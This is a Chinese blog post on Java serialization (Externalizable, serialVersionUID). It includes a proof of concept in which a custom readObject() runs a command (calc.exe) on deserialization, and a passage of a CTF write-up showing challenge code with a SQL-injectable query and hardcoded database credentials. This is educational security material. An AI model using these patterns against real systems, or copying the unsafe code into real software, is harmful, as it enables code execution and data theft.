class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Wanger</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Wanger&#123;&quot;</span> + <span class="string">&quot;name=&quot;</span> + name + <span class="string">&quot;,age=&quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现 <code>Externalizable</code> 接口的 <code>Wanger</code> 类和实现 <code>Serializable</code> 接口的 <code>Wanger</code> 类有一些不同：</p><p>1）新增了一个无参的构造方法。</p><p>使用 <code>Externalizable</code> 进行反序列化的时候，会调用被序列化类的无参构造方法去创建一个新的对象，然后再将被保存对象的字段值复制过去。否则的话，会抛出以下异常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: com.cmower.java_demo.xuliehua1.Wanger; no valid constructor</span><br><span class="line">at java.io.ObjectStreamClass$ExceptionInfo.newInvalidClassException(ObjectStreamClass.java:150)</span><br><span class="line">at java.io.ObjectStreamClass.checkDeserialize(ObjectStreamClass.java:790)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1782)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1353)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:373)</span><br><span class="line">at com.cmower.java_demo.xuliehua1.Test.main(Test.java:27)</span><br></pre></td></tr></table></figure><p>2）新增了两个方法 <code>writeExternal()</code> 和 <code>readExternal()</code>，实现 <code>Externalizable</code> 接口所必须的。</p><p>然后，我们再在测试类中打印序列化前和反序列化后的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;王二&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把对象写到文件中</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));) &#123;</span><br><span class="line">oos.writeObject(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件中读出对象</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));) &#123;</span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger1</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">System.out.println(wanger1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Wanger&#123;name=王二,age=18&#125;</span></span><br><span class="line"><span class="comment">// Wanger&#123;name=null,age=0&#125;</span></span><br></pre></td></tr></table></figure><p>从输出的结果看，反序列化后得到的对象字段都变成了默认值，也就是说，序列化之前的对象状态没有被“冻结”下来。</p><p>为什么呢？因为我们没有为 <code>Wanger</code> 类重写具体的 <code>writeExternal()</code> 和 <code>readExternal()</code> 方法。那该怎么重写呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">out.writeObject(name);</span><br><span class="line">out.writeInt(age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">name = (String) in.readObject();</span><br><span class="line">age = in.readInt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1）调用 <code>ObjectOutput</code> 的 <code>writeObject()</code> 方法将字符串类型的 <code>name</code> 写入到输出流中；<br>2）调用 <code>ObjectOutput</code> 的 <code>writeInt()</code> 方法将整型的 <code>age</code> 写入到输出流中；<br>3）调用 <code>ObjectInput</code> 的 <code>readObject()</code> 方法将字符串类型的 <code>name</code> 读入到输入流中；<br>4）调用 <code>ObjectInput</code> 的 <code>readInt()</code> 方法将字符串类型的 <code>age</code> 读入到输入流中；</p><p>再运行一次测试了类，你会发现对象可以正常地序列化和反序列化了。</p><blockquote><p>序列化前：Wanger{name&#x3D;王二,age&#x3D;18}<br>序列化后：Wanger{name&#x3D;王二,age&#x3D;18}</p></blockquote><p>总结一下：</p><p>Externalizable 和 Serializable 都是用于实现 Java 对象的序列化和反序列化的接口，但是它们有以下区别：</p><p>①、Serializable 是 Java 标准库提供的接口，而 Externalizable 是 Serializable 的子接口；<br><img src="https://cdn.tobebetterjavaer.com/stutymore/Serializbale-20230323161831.png"></p><p>②、Serializable 接口不需要实现任何方法，只需要将需要序列化的类标记为 Serializable 即可，而 Externalizable 接口需要实现 writeExternal 和 readExternal 两个方法；<br>③、Externalizable 接口提供了更高的序列化控制能力，可以在序列化和反序列化过程中对对象进行自定义的处理，如对一些敏感信息进行加密和解密。</p><h3 id="05、再来点甜点"><a href="#05、再来点甜点" class="headerlink" title="05、再来点甜点"></a>05、再来点甜点</h3><p>让我先问问你吧，你知道 <code> private static final long serialVersionUID = -2095916884810199532L;</code> 这段代码的作用吗？</p><p>嗯……</p><p><code>serialVersionUID</code> 被称为序列化 ID，它是决定 Java 对象能否反序列化成功的重要因子。在反序列化时，Java 虚拟机会把字节流中的 <code>serialVersionUID</code> 与被序列化类中的 <code>serialVersionUID</code> 进行比较，如果相同则可以进行反序列化，否则就会抛出序列化版本不一致的异常。</p><p>当一个类实现了 <code>Serializable</code> 接口后，IDE 就会提醒该类最好产生一个序列化 ID，就像下面这样：</p><p><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-4.png"></p><p>1）添加一个默认版本的序列化 ID：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>。</span><br></pre></td></tr></table></figure><p>2）添加一个随机生成的不重复的序列化 ID。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br></pre></td></tr></table></figure><p>3）添加 <code>@SuppressWarnings</code> 注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br></pre></td></tr></table></figure><p>怎么选择呢？</p><p>首先，我们采用第二种办法，在被序列化类中添加一个随机生成的序列化 ID。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他代码忽略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，序列化一个 <code>Wanger</code> 对象到文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;王二&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把对象写到文件中</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));) &#123;</span><br><span class="line">oos.writeObject(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候，我们悄悄地把 <code>Wanger</code> 类的序列化 ID 偷梁换柱一下，嘿嘿。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// private static final long serialVersionUID = -2095916884810199532L;</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199533L</span>;</span><br></pre></td></tr></table></figure><p>好了，准备反序列化吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));) &#123;</span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">System.out.println(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哎呀，出错了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException:  local class incompatible: stream classdesc </span><br><span class="line">serialVersionUID = -2095916884810199532,</span><br><span class="line">local class serialVersionUID = -2095916884810199533</span><br><span class="line">at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)</span><br><span class="line">at com.cmower.java_demo.xuliehua1.Test.main(Test.java:27)</span><br></pre></td></tr></table></figure><p>异常堆栈信息里面告诉我们，从持久化文件里面读取到的序列化 ID 和本地的序列化 ID 不一致，无法反序列化。</p><p>那假如我们采用第三种方法，为 <code>Wanger</code> 类添加个 <code>@SuppressWarnings(&quot;serial&quot;)</code> 注解呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="comment">// 省略其他代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，再来一次反序列化吧。可惜依然报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException:  local class incompatible: stream classdesc </span><br><span class="line">serialVersionUID = -2095916884810199532, </span><br><span class="line">local class serialVersionUID = -3818877437117647968</span><br><span class="line">at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)</span><br><span class="line">at com.cmower.java_demo.xuliehua1.Test.main(Test.java:27)</span><br></pre></td></tr></table></figure><p>异常堆栈信息里面告诉我们，本地的序列化 ID 为 -3818877437117647968，和持久化文件里面读取到的序列化 ID 仍然不一致，无法反序列化。这说明什么呢？使用 <code>@SuppressWarnings(&quot;serial&quot;)</code> 注解时，该注解会为被序列化类自动生成一个随机的序列化 ID。</p><p>由此可以证明，<strong>Java 虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，还有一个非常重要的因素就是序列化 ID 是否一致</strong>。</p><p>也就是说，如果没有特殊需求，采用默认的序列化 ID（1L）就可以，这样可以确保代码一致时反序列化成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"><span class="comment">// 省略其他代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面代码所示，电脑会弹出计算器</p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><p><a href="https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD">https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD</a></p><h2 id="网鼎杯2020朱雀组-ThinkJava"><a href="#网鼎杯2020朱雀组-ThinkJava" class="headerlink" title="[网鼎杯2020朱雀组]ThinkJava"></a>[网鼎杯2020朱雀组]ThinkJava</h2><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html</a><br><a href="https://c.biancheng.net/view/5532.html">https://c.biancheng.net/view/5532.html</a><br><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p><p>这道题开始拿到的有个url，访问时显示没有权限，暂时没有突破点，还有个class压缩包，其中有一些代码，打开后发现有相关的数据库操作类，其中有个swagger，想到swagger的未授权访问，这里用曾哥的脚本扫描下<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image.png"><br><a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a><br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-1.png"><br>访问页面发现有swagger接口测试的口子<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-2.png"><br>观察发现sqlDict，对应下载下来的代码中sqlDict类，这个类的方法<code>getTableData</code>存在sql注入的可能性<br>分析下载的sqlDict代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlDict</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                pass = <span class="string">&quot;abc@12345&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span 